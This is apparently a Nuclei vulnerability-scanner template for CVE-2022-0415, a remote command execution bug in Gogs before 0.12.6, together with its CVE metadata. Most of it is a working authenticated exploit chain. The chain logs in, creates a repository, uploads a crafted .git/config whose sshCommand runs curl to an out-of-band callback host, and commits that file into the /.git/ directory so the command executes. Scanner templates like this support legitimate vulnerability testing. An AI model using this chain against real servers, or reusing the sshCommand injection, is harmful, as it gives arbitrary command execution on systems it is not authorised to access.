http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="_csrf" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: auth_csrf
    regex:
    - name="_csrf" content="(.*)"
    type: regex
  - group: 1
    internal: true
    name: uuid
    regex:
    - ' "uuid": "(.*)"'
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  - part: body_1
    type: word
    words:
    - content="Gogs
  matchers-condition: and
  raw:
  - 'GET /user/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

    '
  - 'GET /repo/create HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /repo/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&user_id=1&repo_name={{randstr}}&description=test&gitignores=&license=&readme=Default&auto_init=on

    '
  - "POST /{{username}}/{{randstr}}/upload-file HTTP/1.1\nHost: {{Hostname}}\nAccept:\
    \ application/json\nX-Requested-With: XMLHttpRequest\nX-Csrf-Token: {{auth_csrf}}\n\
    Content-Type: multipart/form-data; boundary=---------------------------313811965223810628771946318395\n\
    \n-----------------------------313811965223810628771946318395\nContent-Disposition:\
    \ form-data; name=\"file\"; filename=\"config\"\nContent-Type: application/octet-stream\n\
    \n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n\
    \    logallrefupdates = true\n    ignorecase = true\n    precomposeunicode = true\n\
    \    sshCommand = curl http://{{interactsh-url}} -I\n[remote \"origin\"]\n   \
    \ url = git@github.com:torvalds/linux.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n\
    [branch \"master\"]\n    remote = origin\n    merge = refs/heads/master\n-----------------------------313811965223810628771946318395--\n"
  - 'POST /{{username}}/{{randstr}}/_upload/master/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _csrf={{auth_csrf}}&tree_path=/.git/&files={{uuid}}&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=

    '
id: CVE-2022-0415
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-0415
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-434,CWE-20
    epss-percentile: 0.95273
    epss-score: 0.1488
  description: 'Gogs before 0.12.6 is susceptible to remote command execution via
    the uploading repository file in GitHub repository gogs/gogs. An attacker can
    execute malware, obtain sensitive information, modify data, and/or gain full control
    over a compromised system without entering necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands on the target system.

    '
  metadata:
    max-request: 6
    product: gogs
    vendor: gogs
    verified: true
  name: Gogs <0.12.6 - Remote Command Execution
  reference:
  - https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284
  - https://huntr.dev/bounties/b4928cfe-4110-462f-a180-6d5673797902
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0415
  remediation: Fixed in version 0.12.6.
  severity: high
  tags: rce,gogs,authenticated,huntr,cve,cve2022,intrusive
